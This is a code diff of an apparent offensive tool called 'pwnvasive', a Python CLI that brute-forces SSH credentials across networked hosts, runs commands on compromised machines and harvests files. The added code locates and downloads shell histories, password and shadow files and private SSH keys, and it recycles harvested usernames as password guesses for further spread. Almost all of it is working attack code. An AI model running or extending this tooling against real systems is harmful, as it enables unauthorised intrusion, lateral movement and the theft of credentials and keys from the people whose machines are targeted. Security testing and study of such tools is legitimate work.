@@ -6,10 +6,15 @@ import json
 import argparse
 import logging
 from aiocmd import aiocmd
+from prompt_toolkit.completion import WordCompleter,NestedCompleter
 import os
 from enum import Enum,auto
 import base64
 import zlib
+import re
+from collections import OrderedDict,Counter
+from itertools import islice
+from contextvars import ContextVar
 
 logging.basicConfig()
 logging.getLogger("asyncio").setLevel(logging.WARNING)
@@ -21,6 +26,14 @@ class States(Enum):
     CONNECTED = 3
     IDENTIFIED = 4
     HARVESTED = 5
+
+async def gather_limited(n, *tasks, return_exceptions=False):
+    semaphore = asyncio.Semaphore(n)
+    async def _task(t):
+        async with semaphore:
+            return await t
+    return await asyncio.gather(*(_task(t) for t in tasks),
+                                return_exceptions=return_exceptions)
 
 class JSONEnc(json.JSONEncoder):
     def default(self, o):
@@ -38,9 +51,11 @@ class OS(object):
         self.node = node
 
 class Linux(OS):
+    re_interesting = re.compile(r"history|pass|shadow|/id_|\.(xls|key|pub)$")
+
     @property
     def file_list(self):
-        return self.node.config.linuxfile
+        return self.node.config.linuxfiles
 
     async def run(self, cmd):
         sout,serr = await self.node.run(cmd)
@@ -63,23 +78,129 @@ class Linux(OS):
         logins = set(x.split(":")[0] for x in out.splitlines())
         return list(logins)
 
-    async def collect_files(self):
-        files = ["/etc/passwd", "/etc/shadow", "/etc/fstab", "/etc/inittab"]
+    async def get_filenames(self):
+        ## XXX Avoid smb and nfs ?
+        ## uglier than find -fstype but works with busybox' find
+        sout,_ = await self.node.run("awk '$3~/^(ext2|ext3|ext4|overlay|tmpfs|zfs|reiserfs|jfs|btrfs|xfs|minix|vfat|exfat|udf|ntfs|msdos|umsdos)$/{print $2}' /proc/mounts | while read a; do find $a -xdev -size -8k -print0 ; done")
+        rawfnames = sout.split("\0")
+        pubfiles = [ f for f in rawfnames if f.endswith(".pub") ]
+        keyfiles = set([ f[:-4] for f in pubfiles ])
+        interesting_files = set([ f for f in rawfnames if self.re_interesting.search(f) ])
+        return list(interesting_files|keyfiles)
 
-class Mapping(object):
-    _key = None
-    _fields = []
+
+class Collection(object):
+    def __init__(self, mapping, lst=None):
+        self.mapping = mapping
+        if lst is None:
+            lst = []
+        keys = [x.key for x in lst]
+        if len(set(keys)) != len(keys):
+            dups = [k for k,c in collections.Counter(keys).items() if c > 1]
+            raise KeyError(f"Duplicate keys: {' '.join(dups)}")
+        self.coll = OrderedDict([(x.key,x) for x in lst])
+    def to_json(self):
+        return list(self.coll.values())
+    def __json__(self):
+        return self.to_json()
+    def __contains__(self, obj):
+        return obj.key in self.coll
+    def __len__(self):
+        return len(self.coll)
+    def __getitem__(self, selector):
+        if isinstance(selector, Mapping):
+            self.coll[selector.key]
+        else:
+            try:
+                selector = int(selector)
+            except:
+                pass
+            else:
+                try:
+                    return next(islice(self.coll.values(), selector, None))
+                except StopIteration:
+                    raise KeyError(selector)
+            if type(selector) is str:
+                selector = self.mapping.str2key(selector)
+            return self.coll[selector]
+    def select(self, selector):
+        if selector in ["all", "*"]:
+            return list(self.coll.values())
+        else:
+            return [self[selector]]
+    def items(self):
+        return self.coll.items()
+    def values(self):
+        return self.coll.values()
+    def keys(self):
+        return self.coll.keys()
+    def __iter__(self):
+        return iter(self.coll.values())
+    def add(self, obj):
+        if obj in self:
+            raise KeyError(f"Object already present")
+        self.coll[obj.key] = obj
+    def add_batch(self, lst):
+        n = 0
+        for o in lst:
+            if o not in self:
+                self.coll[o.key] = o
+                n += 1
+        return n
+    def update(self, obj):
+        if obj not in self:
+            raise KeyError(f"Key {obj.key} not found")
+        self[obj].update(obj)
+    def __repr__(self):
+        return "<Collection: %s>" % ("\n".join(f"{o.key}" for o in self.values()))
+    def string_menu(self):
+        return "\n".join(f"{i:2}: {o}" for i,o in enumerate(self.values()))
+
+
+### Mappings
+
+class MappingMeta(type):
+    def __new__(cls, name, bases, dct):
+        _k = dct.get("_key")
+        _f = dct.get("_fields")
+        if _k is None:
+            if _f:
+                _k = (next(islice(_f.keys(), 1)),)
+                dct["_key"] = _k
+        _kt = dct.get("_keytype")
+        if _kt is None and _k is not None:
+            _kt = tuple(_f[k][1] for k in _k)
+            dct["_keytype"] = _kt
+        return super().__new__(cls, name, bases, dct)
+
+class Mapping(object, metaclass=MappingMeta):
+    _fields = {}
+    _key = None # tuple. If None, metaclass will use the first field of _field.
+    _keytype = None # automatically computed from _key and _fields by metaclass
     def __init__(self, config=None, **kargs):
         self.config = config
         self.values = {}
-        for f,v,_ in self._fields:
+        for f,(v,_) in self._fields.items():
             self.values[f] = kargs.pop(f, v)
-        if self._key is None:
-            self._key = self._fields[0][0]
     def __getattr__(self, attr):
         if attr in self.values:
             return self.values[attr]
         raise AttributeError(attr)
+    def __getitem__(self, item):
+        return self.values[item]
+    @property
+    def key(self):
+        return tuple(self.values[x] for x in self._key)
+    @classmethod
+    def str2key(cls, s):
+        return tuple(t(v) for t,v in zip(cls._keytype, s.split(":")))
+    @property
+    def shortname(self):
+        return ":".join(str(self.values.get(k, "")) for k in self._key)
+    def update(self, other):
+        for f in self._fields:
+            if f in other:
+                self.values[f] = other[f]
     @classmethod
     def from_json(cls, j, config=None):
         return cls(config=config, **j)
@@ -100,33 +221,52 @@ class Mapping(object):
         r = ", ".join(f"{k}={fmtval(v)}" for k,v in self.values.items() if v is not None)
         return f"<{r}>"
 
-class Net(Mapping):
-    _fields = [
-        ("cidr", "127.0.0.1/32", str),
-        ("scanned", False, bool),
-    ]
 
+
+
+class Net(Mapping):
+    _fields = {
+        "cidr": ("127.0.0.1/32", str),
+        "scanned": (False, bool),
+    }
+
+class Logins(Mapping):
+    _fields = {
+        "login": (None, str),
+    }
+
+class Passwords(Mapping):
+    _fields = {
+        "password": (None, str),
+    }
+
+class SSHKeys(Mapping):
+    _fields = {
+        "key":      (None, str),
+        "password": (None, str),
+    }
 
 class LinuxFiles(Mapping):
-    _fields = [
-        ("path", "", str),
-    ]
-
-
+    _fields = {
+        "path": ("", str),
+    }
 
 class Node(Mapping):
-    _fields = [
-        ("ip", "127.0.0.1", str),
-        ("port", 22, int),
-        ("controlled", False, bool),
-        ("ssh_login", None, str),
-        ("ssh_password", None, str),
-        ("ssh_key", None, str),
-        ("tested_credentials", [], list),
-        ("working_credentials", [], list),
-        ("os", None, str),
-        ("files", {}, dict),
-    ]
+    _key = ("ip", "port")
+    _fields = {
+        "ip":                  ("127.0.0.1", str),
+        "port":                (22, int),
+        "controlled":          (False, bool),
+        "reachable":           (False, bool),
+        "jump_host":           (None, tuple),
+        "ssh_login":           (None, str),
+        "ssh_password":        (None, str),
+        "ssh_key":             (None, str),
+        "tested_credentials":  ([], list),
+        "working_credentials": ([], list),
+        "os":                  (None, str),
+        "files":               ({}, dict),
+    }
 
     def __init__(self, **kargs):
         super().__init__(**kargs)
@@ -135,33 +275,23 @@ class Node(Mapping):
         if self.values.get("os") == "linux":
             self.os = Linux(self)
 
-    async def run(self, cmd):
-        r = await self.session.run(cmd)
-        return r.stdout, r.stderr
-
     async def get_file(self, path):
         async with self.session.session.start_sftp_client() as sftp:
             f = await sftp.open(path, "rb")
             return await f.read()
 
-    async def get_files(self, *paths):
-        async with self.session.session.start_sftp_client() as sftp:
-            lst = await sftp.glob(paths)
-            content = await asyncio.gather(*[self.get_file(x) for x in lst if x not in self.files])
-        zcontent = [base64.b85encode(zlib.compress(c)).decode("ascii") for c in content]
-        d = dict(zip(lst, zcontent))
-        self.files.update(d)
-        return d
+    async def get_zfile(self, path):
+        content = await self.get_file(path)
+        return base64.b85encode(zlib.compress(c)).decode("ascii")
 
+    async def get_filenames(self):
+        return await self.os.get_filenames()
 
     async def get_glob(self, pattern):
         async with self.session.session.start_sftp_client() as sftp:
             return await sftp.glob(pattern)
 
 
-    async def get_all_files(self):
-        lst = [f.path for f in  self.os.file_list]
-        return await self.get_files(*lst)
 
     async def test_creds(self, login, pwd):
         opt = asyncssh.SSHClientConnectionOptions(username=login, password=pwd, known_hosts=None)
@@ -176,8 +306,11 @@ class Node(Mapping):
     async def ensure_reached(self):
         if self.state.value >= States.REACHED.value:
             return True
+        if self.jump_host is not None:
+            raise NotImplementedError("Jump host connectivity test")
         await asyncio.open_connection(self.ip, self.port)
         self.state = States.REACHED
+        self.values["reachable"] = True
         return True
 
     async def ensure_connected(self):
@@ -188,8 +321,8 @@ class Node(Mapping):
 
         # XXX manage keys
         if self.ssh_login is None or self.ssh_password is None:
-            logins = [l.login for l in self.config.login]
-            passwords = [p.password for p in self.config.password]
+            logins = [l.login for l in self.config.logins]
+            passwords = [p.password for p in self.config.passwords]
 
             res = await asyncio.gather(*[
                 self.test_creds(l,p)
@@ -217,7 +350,7 @@ class Node(Mapping):
             return True
         if not await self.ensure_connected():
             return False
-        sout,serr = await self.run("uname -o")
+        sout,serr = await self._run("uname -o")
         if sout.startswith("Linux"):
             self.os = Linux(self)
             self.values["os"] = "linux"
@@ -226,13 +359,59 @@ class Node(Mapping):
         else:
             return False
 
+    async def _run(self, cmd):
+        r = await self.session.run(cmd)
+        return r.stdout, r.stderr
+
+    async def run(self, cmd):
+        if not await self.ensure_identified():
+            raise Exception(f"could not connect to {self}")
+        return await self._run(cmd)
+
+    async def _sftp_get_zfile(self, sftp, fname):
+        f = await sftp.open(fname, "rb")
+        content = await f.read()
+        return base64.b85encode(zlib.compress(content)).decode("ascii")
+
+    async def get_files(self, *paths):
+        if not await self.ensure_identified():
+            raise Exception(f"could not connect to {self}")
+        async with self.session.session.start_sftp_client() as sftp:
+            try:
+                lst = await sftp.glob(paths, error_handler=lambda x:None)
+            except asyncssh.SFTPNoSuchFile:
+                return {}
+
+            content = await gather_limited(
+                10,
+                *(self._sftp_get_zfile(sftp, f)
+                  for f in lst if f not in self.files),
+                return_exceptions=True)
+        d = { k:v for k,v in zip(lst, content) if type(v) is str }
+        self.files.update(d)
+        return d
+
+    async def get_all_files(self):
+        if not await self.ensure_identified():
+            raise Exception(f"could not connect to {self}")
+        lst = [f.path for f in self.os.file_list]
+        return await self.get_files(*lst)
+
+    async def get_logins(self):
+        if not await self.ensure_identified():
+            raise Exception(f"could not connect to {self}")
+        return await self.os.collect_logins()
+
+
     async def connect(self):
         if not await self.ensure_identified():
-            return None
+            raise Exception(f"could not connect to {self}")
         return self.session
+
 
     async def collect(self):
         pass
+
 
 class NodeSession(object):
     def __init__(self, node, session):
@@ -245,23 +424,6 @@ class NodeSession(object):
     async def start_sftp_client(self, *args, **kargs):
         return await self.session.start_sftp_client(*args, **kargs)
 
-class Logins(Mapping):
-    _fields = [
-        ("login", None, str),
-    ]
-
-class Passwords(Mapping):
-    _fields = [
-        ("password", None, str),
-    ]
-
-class SSHKeys(Mapping):
-    _fields = [
-        ("key", None, str),
-        ("password", None, str),
-    ]
-
-
 
 DEFAULT_CONFIG = {
     "meta": { "version": "0.1", },
@@ -271,12 +433,12 @@ DEFAULT_CONFIG = {
 
 class Config(object):
     _objects = {
-        "network": Net,
-        "node": Node,
-        "login": Logins,
-        "password": Passwords,
-        "sshkey": SSHKeys,
-        "linuxfile": LinuxFiles,
+        "networks": Net,
+        "nodes": Node,
+        "logins": Logins,
+        "passwords": Passwords,
+        "sshkeys": SSHKeys,
+        "linuxfiles": LinuxFiles,
     }
     def __init__(self, fname=None, json_=None):
         self.fname = fname
@@ -291,8 +453,7 @@ class Config(object):
         s = self.config["state"]
         self.objects = {}
         for f,c in self._objects.items():
-            self.objects[f] = [c.from_json(d, config=self) for d in  s.get(f,[])]
-
+            self.objects[f] = Collection(c, [c.from_json(d, config=self) for d in  s.get(f,[])])
 
     def __getattr__(self, attr):
         if attr in self.objects:
@@ -324,26 +485,86 @@ class SSH(Link):
 
 class PwnCLI(aiocmd.PromptToolkitCmd):
     def __init__(self, options):
-        super().__init__()
-        self.prompt = "pwnvasive > "
         self.options = options
         self.cfg = options.config
+        self.prompt = "pwnvasive > "
+        super().__init__()
         self.sessions = []
 
-    def do_add(self, obj, val=""):
-        val = { k.strip():v.strip() for k,v in [x.strip().split("=",1) for x in val.split(",")] }
-        Obj = self.cfg._objects[obj]
-        o = Obj(config=self.cfg, **val)
-        self.cfg.objects[obj].append(o)
 
-    def do_ls(self, obj):
-        if obj == "cnx":
-            lst = self.sessions
+    def str2map(self, s):
+        return { k.strip():v.strip() for k,v in [x.strip().split("=",1) for x in s.split(",")] }
+
+
+    ########## DEBUG
+
+    def do_eval(self, cmd):
+        print(eval(cmd))
+
+
+    ########## MANAGE COLLECTIONS AND MAPPINGS
+
+    def do_ls(self, obj=None, selector=None):
+        if obj is None:
+            print("\n".join(self.cfg.objects))
         else:
-            lst = self.cfg.objects[obj]
+            if selector is None:
+                print(self.cfg.objects[obj].string_menu())
+            else:
+                print(self.cfg.objects[obj][selector])
 
-        for i,o in enumerate(lst):
-            print(f"{i:3}: {o}")
+    def _ls_completions(self):
+        return WordCompleter(list(self.cfg.objects))
+
+    def do_add(self, obj, val=""):
+        try:
+            val = self.str2map(val)
+        except:
+            print(f"could not parse [{val}]. Should be field=value[,f=v[,...]]")
+        else:
+            Obj = self.cfg._objects[obj]
+            o = Obj(config=self.cfg, **val)
+            print(f"adding {o}")
+            self.cfg.objects[obj].add(o)
+
+    def _add_completions(self):
+        return WordCompleter(list(self.cfg._objects))
+#        XXX: fix nested completer
+#        print({k: {f:None for f in v._fields} for k,v in self.cfg._objects.items() })
+#        return NestedCompleter({k: {f:None for f in v._fields} for k,v in self.cfg._objects.items() })
+
+
+    def do_update(self, obj, selector, val):
+        try:
+            val = self.str2map(val)
+        except:
+            print(f"could not parse [{val}]. Should be field=value[,f=v[,...]]")
+            raise
+
+        objs = self.cfg.objects[obj].select(selector)
+        for o in objs:
+            print(f"Updating {o}")
+            for f,(_,t) in o._fields.items():
+                if f in val:
+                    old = o.values.get(f,None)
+                    new_ = t(val[f])
+                    print(f"  + {f}: {old} --> {new_}")
+                    o.values[f] = new_
+
+    ########## CNX
+
+    async def do_cnx(self, selector=None):
+        if selector is None:
+            for n in self.cfg.nodes:
+                if n.session:
+                    print(n.session)
+        else:
+            nodes = self.cfg.nodes.select(selector)
+            for node in nodes:
+                print(f"connecting to {node}")
+                cnx = node.connect()
+                t = asyncio.create_task(cnx)
+                t.add_done_callback(self.cb_connected)
 
     def cb_connected(self, t):
         try:
@@ -355,84 +576,85 @@ class PwnCLI(aiocmd.PromptToolkitCmd):
                 print(f"Connected to {nsession} (#{len(self.sessions)})")
                 self.sessions.append(nsession)
 
-    def cb_get_files(self, t):
-        files = t.result()
-        print(f"retrieved: {files}")
+
+    ########## RUN
+
+    async def do_run(self, selector, cmd):
+
+        async def run_and_print(node, cmd):
+            try:
+                sout,serr = await node.run(cmd)
+            except Exception as e:
+                print(f"-----[{node}]-----")
+                print(e)
+            else:
+                print(f"-----[{node.session}]-----")
+                print(sout)
+
+        nodes = self.cfg.nodes.select(selector)
+        res = await asyncio.gather(*[run_and_print(node, cmd) for node in nodes])
 
 
+    ######### HARVEST
 
-    async def do_cnx(self, hostnum):
-        if hostnum == "all":
-            nodes = self.cfg.node
-        else:
-            hostnum = int(hostnum)
-            nodes = [self.cfg.node[hostnum]]
+    async def do_info(self, selector):
+        nodes = self.cfg.nodes.select(selector)
+        async def print_info(node):
+            try:
+                await node.connect()
+            except Exception as e:
+                print(f"------[{node}]------")
+                print(e)
+            else:
+                nfo = await node.os.get_all()
+                print(f"------[{node}]------")
+                print(json.dumps(nfo, indent=4))
+        await asyncio.gather(*[print_info(node) for node in nodes])
+
+
+    async def do_getfilenames(self, selector):
+        nodes = self.cfg.nodes.select(selector)
         for node in nodes:
-            print(f"connecting to {node}")
-            cnx = node.connect()
-            t = asyncio.create_task(cnx)
-            t.add_done_callback(self.cb_connected)
+            t = asyncio.create_task(node.get_filenames())
+            t.add_done_callback(lambda ctx:self.cb_get_filenames(node, ctx))
+
+    def cb_get_filenames(self, node, t):
+        fnames = t.result()
+        coll = node.os.file_list
+        fnameobjects = [coll.mapping(config=self.cfg, path=p) for p in fnames]
+        newfilesnb = coll.add_batch(fnameobjects)
+        print(f"{node.shortname}: retrieved {len(fnames)} file names. {newfilesnb} were new.")
 
 
 
-    async def do_run(self, cnxnum, cmd):
-        if cnxnum == "all":
-            nsess = self.sessions
-        else:
-            cnxnum = int(cnxnum)
-            nsess = [self.sessions[cnxnum]]
-        async def run_and_print(s, cmd):
-            r = await s.run(cmd)
-            print(f"-----[{s}]-----")
-            print(r.stdout)
-        res = await asyncio.gather(*[run_and_print(s, cmd) for s in nsess])
+    async def do_getfiles(self, selector):
+        nodes = self.cfg.nodes.select(selector)
+        for node in nodes:
+            t = asyncio.create_task(node.get_all_files())
+            t.add_done_callback(lambda ctx: self.cb_get_files(node, ctx))
+
+    def cb_get_files(self, node, t):
+        files = t.result()
+        print(f"{node.shortname}: retrieved {len(files)} new files")
 
 
-    def do_update(self, obj, objnum, val):
-        objnum = int(objnum)
-        val = { k.strip():v.strip() for k,v in [x.strip().split("=",1) for x in val.split(",")] }
-        o = self.cfg.objects[obj][objnum]
-        print(f"Updating {o}")
-        for f,_,t in o._fields:
-            if f in val:
-                old = o.values.get(f,None)
-                new_ = t(val[f])
-                print(f"  + {f}: {old} --> {new_}")
-                o.values[f] = new_
+
+    async def do_getlogins(self, selector):
+        nodes = self.cfg.nodes.select(selector)
+        for node in nodes:
+            t = asyncio.create_task(node.get_logins())
+            t.add_done_callback(lambda ctx: self.cb_get_logins(node, ctx))
+
+    def cb_get_logins(self, node, t):
+        logins = t.result()
+        olog = [self.cfg.logins.mapping(config=self.cfg, login=l) for l in logins]
+        nlog = self.cfg.logins.add_batch(olog)
+        opwd = [self.cfg.passwords.mapping(config=self.cfg, password=l) for l in logins]
+        npwd = self.cfg.passwords.add_batch(opwd)
+        print(f"{node.shortname}: {nlog} new logins, {npwd} new passwords")
 
 
-    async def do_info(self, cnxnum):
-        cnxnum = int(cnxnum)
-        nsess = self.sessions[cnxnum]
-        print(await nsess.node.os.get_all())
 
-    async def do_collect(self, cnxnum):
-        cnxnum = int(cnxnum)
-        nsess = self.sessions[cnxnum]
-        logins = await nsess.node.os.collect_logins()
-        print(logins)
-
-        exising_logins = set(l.login for l in self.cfg.login)
-        exising_passwords = set(p.password for p in self.cfg.password)
-
-        for l in logins:
-            if l not in exising_logins:
-                lo = Logins(config=self.cfg, login=l)
-                self.cfg.login.append(lo)
-            if l not in exising_passwords:
-                p = Passwords(config=self.cfg, password=l)
-                self.cfg.password.append(p)
-
-    async def do_getfiles(self, cnxnum):
-        if cnxnum == "all":
-            nsess = self.sessions
-        else:
-            cnxnum = int(cnxnum)
-            nsess = [self.sessions[cnxnum]]
-        for sess in nsess:
-            t = asyncio.create_task(sess.node.get_all_files())
-            t.add_done_callback(self.cb_get_files)
-            
 
 def main(args=None):
     parser = argparse.ArgumentParser()
